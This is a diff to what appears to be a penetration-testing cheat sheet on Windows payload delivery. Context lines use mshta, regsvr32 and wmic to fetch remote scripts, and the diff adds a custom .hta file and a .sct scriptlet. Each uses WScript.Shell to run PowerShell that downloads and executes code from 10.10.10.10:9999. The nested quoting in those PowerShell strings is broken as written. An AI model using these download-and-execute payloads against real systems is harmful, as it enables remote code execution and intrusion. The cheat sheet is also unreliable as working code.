@@ -21,10 +21,38 @@ Mshta:
 mshta http://10.10.10.10:9999/rev.hta
 mshta vbscript:Close(Execute("GetObject(""script:http://10.10.10.10:9999/rev.sct"")"))
 ```
+Create custom .hta file
+```
+<html>
+<head>
+<HTA:APPLICATION ID="HelloExample">
+<script language="jscript">
+        var c = "powershell "IEX( IWR http://10.10.10.10:9999 -UseBasicParsing)""; 
+        new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</head>
+<body>
+<script>self.close();</script>
+</body>
+</html>
+```
 
 Regsvr32:
 ```
 regsvr32 /s /n /u /i:http://10.10.10.10:9999/rev.sct scrobj.dll
+```
+Create custom .sct file
+```
+<?XML version="1.0"?>
+<scriptlet>
+	<registration progid="PqYOEI6w" classid="{057b64c8-1107-cda1-3d34-062978395f62}">
+		<script>
+			<![CDATA[ 
+			var r = new ActiveXObject("WScript.Shell").Run("powershell "IEX( IWR http://10.10.10.10:9999 -UseBasicParsing)"", 0);
+			]]>
+		</script>
+	</registration>
+</scriptlet>
 ```
 
 Msiexec:
@@ -37,7 +65,7 @@ Wmic:
 wmic os get /FORMAT:"http://10.10.10.10:9999/rev.xsl"
 ```
 
-File Transfers (Linux)
+# File Transfers (Linux)
 
 Wget:
 ```
